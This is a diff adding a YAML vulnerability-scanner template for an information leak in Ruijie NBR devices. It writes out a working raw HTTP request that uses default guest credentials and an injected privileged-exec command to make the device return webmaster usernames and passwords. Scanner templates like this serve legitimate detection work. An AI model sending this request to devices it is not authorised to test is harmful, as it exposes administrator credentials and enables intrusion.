@@ -1,0 +1,29 @@
+id: ruijie-nbr-infoleak
+
+info:
+  name: Ruijie NBR Information Leak
+  author: ProjectDiscoveryAI
+  severity: low
+  description: |
+    Detects information leakage in Ruijie NBR devices by checking for sensitive 
+    details in the response body when a specific request is made.
+
+http:
+  - raw:
+      - |
+        POST /WEB_VMS/LEVEL15/ HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+        Content-Type: application/x-www-form-urlencoded
+
+        command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "webmaster level 2 username guest password guest"
